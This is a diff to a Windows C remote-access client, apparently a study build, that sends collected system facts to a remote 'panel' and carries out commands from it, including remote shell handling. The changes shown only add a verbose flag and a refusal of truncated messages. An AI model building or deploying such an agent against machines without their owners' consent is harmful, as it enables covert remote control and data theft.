@@ -21,6 +21,7 @@
  *       transport.c shell.c report.c system_facts.c -lwinhttp -ladvapi32
  * Run:
  *   relay_client.exe <URL>        e.g. ... https://relay.example.com/agent
+ *   relay_client.exe <URL> -v     verbose: dump every command's raw bytes
  *
  * The URL comes only from the command line; nothing is hardcoded.
  *
@@ -39,6 +40,7 @@
 #include <windows.h>
 #include <winhttp.h>
 #include <stdio.h>
+#include <string.h>      /* strcmp (the -v flag) */
 
 #include "protocol.h"
 #include "wire.h"
@@ -87,6 +89,10 @@ static int build_identity_frame(unsigned char frame[IDENTITY_FRAME_SIZE],
  * Command handlers (one reply per request, except Exit)
  * ======================================================================== */
 
+/* Verbose mode (-v): dump every command's raw bytes. Default is one line
+ * per event, like a release agent - the full wire dump is a study tool. */
+static int verbose = 0;
+
 /* Reply to Hello: collect facts, build the frame, send it, show it. */
 static DWORD handle_hello(HINTERNET socket)
 {
@@ -100,7 +106,8 @@ static DWORD handle_hello(HINTERNET socket)
     if (err != NO_ERROR)
         return err;
     printf("[+] identity sent to the panel (%d bytes)\n", frame_len);
-    print_identity_frame(frame, frame_len);
+    if (verbose)
+        print_identity_frame(frame, frame_len);
     fflush(stdout);
     return NO_ERROR;
 }
@@ -236,10 +243,13 @@ static DWORD handle_close_shell(HINTERNET socket, const incoming_message *msg)
 int main(int argc, char *argv[])
 {
     /* ----- Stage 1: the URL must come from the command line ----- */
-    if (argc != 2) {
+    if (argc == 3 && strcmp(argv[2], "-v") == 0)
+        verbose = 1;
+    else if (argc != 2) {
         fprintf(stderr,
-                "usage: relay_client.exe <URL>\n"
-                "example: relay_client.exe https://relay.example.com/agent\n");
+                "usage: relay_client.exe <URL> [-v]\n"
+                "example: relay_client.exe https://relay.example.com/agent\n"
+                "-v = verbose: dump every command's raw bytes\n");
         return 1;
     }
 
@@ -347,9 +357,25 @@ int main(int argc, char *argv[])
             goto shutdown;
         }
 
-        print_command(index, &msg);
+        if (verbose)
+            print_command(index, &msg);
 
         unsigned char opcode = (msg.length > 0) ? msg.data[0] : 0xFF;
+
+        /* A message that overflowed the receive buffer is refused whole:
+         * executing its head would run half a command. */
+        if (msg.truncated) {
+            unsigned char status_error[4] = {1, 0, 0, 0};
+            err = ws_send(socket, status_error, sizeof(status_error));
+            if (err == NO_ERROR) {
+                printf("[!] message over %d bytes - refused, status 1\n",
+                       MAX_MESSAGE_SIZE);
+                fflush(stdout);
+                continue;
+            }
+            print_error_code("WinHttpWebSocketSend(reply)", err);
+            goto cleanup;
+        }
 
         if (opcode == CMD_EXIT) {       /* Exit: no reply, terminate now */
             printf("[!] Exit requested - terminating.\n");
